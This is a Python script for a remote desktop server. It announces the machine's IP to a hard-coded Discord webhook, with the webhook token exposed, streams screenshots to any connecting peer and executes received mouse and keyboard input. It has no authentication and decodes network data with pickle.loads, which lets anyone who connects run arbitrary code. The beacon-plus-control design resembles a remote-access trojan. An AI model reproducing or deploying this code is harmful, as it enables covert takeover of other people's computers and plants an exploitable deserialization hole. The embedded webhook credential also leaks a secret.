import socket
import threading
import struct
import pyautogui
import cv2
import numpy as np
import pickle
import requests

HOST = '0.0.0.0'
PORT = 9999
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1379788128855789588/4BT1_x7PauAzxyjua_0QY4g9Ttzra0OlEJBxJL2S72JDYWMYTFufwKXR6cqIXGHXFiwi"

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def send_ip_to_discord(ip):
    data = {"content": f"🖥️ Screen sharing server started at IP: `{ip}` on port {PORT}"}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
        print("Sent IP to Discord webhook.")
    except Exception as e:
        print("Failed to send IP to webhook:", e)

def send_screen(conn):
    try:
        while True:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            encoded, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            data = buffer.tobytes()
            size = len(data)
            conn.sendall(struct.pack(">L", size) + data)
    except Exception as e:
        print(f"Screen sending error: {e}")

def receive_controls(conn):
    try:
        while True:
            length_bytes = conn.recv(4)
            if not length_bytes:
                break
            length = struct.unpack(">L", length_bytes)[0]
            data = b''
            while len(data) < length:
                packet = conn.recv(length - len(data))
                if not packet:
                    break
                data += packet
            if not data:
                break

            commands = pickle.loads(data)

            if commands['type'] == 'move':
                x, y = commands['pos']
                pyautogui.moveTo(x, y)
            elif commands['type'] == 'click':
                button = commands.get('button', 'left')
                pyautogui.click(button=button)
            elif commands['type'] == 'scroll':
                clicks = commands.get('clicks', 0)
                pyautogui.scroll(clicks)
            elif commands['type'] == 'keypress':
                key = commands.get('key')
                pyautogui.press(key)
            elif commands['type'] == 'keydown':
                key = commands.get('key')
                pyautogui.keyDown(key)
            elif commands['type'] == 'keyup':
                key = commands.get('key')
                pyautogui.keyUp(key)
    except Exception as e:
        print(f"Control receiving error: {e}")

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)

    local_ip = get_local_ip()
    print(f"Listening on {local_ip}:{PORT} ...")
    send_ip_to_discord(local_ip)

    conn, addr = s.accept()
    print(f"Connected by {addr}")

    threading.Thread(target=send_screen, args=(conn,), daemon=True).start()
    threading.Thread(target=receive_controls, args=(conn,), daemon=True).start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Server shutting down.")
        conn.close()
        s.close()

if __name__ == "__main__":
    main()